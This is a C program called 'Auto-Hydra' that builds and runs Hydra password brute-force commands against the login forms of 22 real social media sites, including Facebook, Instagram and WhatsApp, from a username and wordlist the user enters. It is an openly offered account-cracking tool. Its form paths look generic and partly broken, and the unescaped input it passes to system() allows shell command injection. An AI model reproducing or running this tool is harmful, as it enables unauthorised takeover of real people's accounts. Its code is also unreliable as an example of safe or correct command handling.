#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#define RED "\033[1;31m"
#define GREEN "\033[1;32m"
#define YELLOW "\033[1;33m"
#define BLUE "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN "\033[1;36m"
#define WHITE "\033[1;37m"
#define RESET "\033[0m"

void ExecuteHydra(int selectednumber, const char* username, const char* wordlist){
    char cmd[1000];
    char defaultcmd[1000];

    sprintf(cmd, "hydra -l %s -P %s", username, wordlist);
    sprintf(defaultcmd, "hydra -l %s -P default.wordlist.txt", username);

    switch(selectednumber){
        case 1: // Facebook
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " facebook.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " facebook.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 2: // Instagram
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " instagram.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " instagram.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 3: // Twitter
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " twitter.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " twitter.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 4: // LinkedIn
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " linkedin.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " linkedin.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 5: // Snapchat
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " snapchat.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " snapchat.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 6: // Pinterest
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " pinterest.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " pinterest.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 7: // Reddit
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " reddit.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " reddit.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 8: // Tumblr
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " tumblr.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " tumblr.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 9: // VK
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " vk.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " vk.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 10: // WeChat
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " wechat.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " wechat.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 11: // WhatsApp
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " whatsapp.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " whatsapp.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 12: // Telegram
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " telegram.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " telegram.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 13: // Line
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " line.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " line.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 14: // KakaoTalk
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " kakaotalk.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " kakaotalk.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 15: // Viber
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " viber.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " viber.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 16: // TikTok
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " tiktok.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " tiktok.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 17: // Flickr
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " flickr.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " flickr.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 18: // MeetMe
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " meetme.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " meetme.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 19: // Badoo
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " badoo.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " badoo.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 20: // MySpace
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " myspace.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " myspace.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 21: // Hi5
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " hi5.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " hi5.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        case 22: // Orkut
            if(strcmp(wordlist, "d")==0 || strcmp(wordlist, "D")==0){
                strcat(defaultcmd, " orkut.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -v");
                system(defaultcmd);
            } else {
                strcat(cmd, " orkut.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" /login.php");
                system(cmd);
            }
            break;
        default:
            printf("Invalid selection.\n");
            break;
    }
}

struct SM{

    const char* name;
    int id;
};

struct SM socialMedia[] = {
    {"facebook", 1},
    {"instagram", 2},
    {"twitter", 3},
    {"linkedin", 4},
    {"snapchat", 5},
    {"pinterest",6},
    {"reddit", 7},
    {"tumblr", 8},
    {"VK", 9},
    {"WeChat", 10},
    {"WhatsApp", 11},
    {"telegram", 12},
    {"line", 13},
    {"kakaoTalk", 14},
    {"viber", 15},
    {"tiktok", 16},
    {"flickr",17},
    {"MeetMe", 18},
    {"badoo", 19},
    {"mySpace", 20},
    {"hi5", 21},
    {"Orkut", 22},
};

int main(){
    char username[100];
    char wordlist[100];
    int selectednumber;

    printf(RED"!!!!!!!!!!!!!!!!!Welcome to Auto-Hydra!!!!!!!!!!!!!!!!!!\n");

    system("python HydraASCII.py");

    sleep(2);

    system("clear");

    printf("\033[1;35m");
    printf("\n");
    printf("Here are your Options:\n");
for (int i = 0; i < sizeof(socialMedia) / sizeof(socialMedia[0]); i++) {
    printf("\033[1;33m%02d)%s[%d]\t\033[0m", i + 1, socialMedia[i].name, socialMedia[i].id);
    if ((i + 1) % 3 == 0) // Print 3 options per line
        printf("\n");
}
printf("\n");
printf("\n");

    printf("\033[1;32m");
    printf("Select Any Number Please:");
    scanf("%d", &selectednumber);

    int i;

    for (i=0; i < sizeof(socialMedia) / sizeof(socialMedia[0]);i++) {
    if (selectednumber == socialMedia[i].id) {
      printf("\033[1;33m");
      printf("You Selected: %s\n", socialMedia[i].name);
      break;
    }
    }
if (i== sizeof(socialMedia) / sizeof(socialMedia[0])){
    printf("Invalid Selection.\n");
}
    printf("\033[1;34m");
    printf("Enter the username:");
    scanf("%s", username);

    printf("Enter the path to your wordlist(d for default wordlist):");
    scanf("%s", wordlist);

ExecuteHydra(selectednumber,username,wordlist);


    return 0;
}

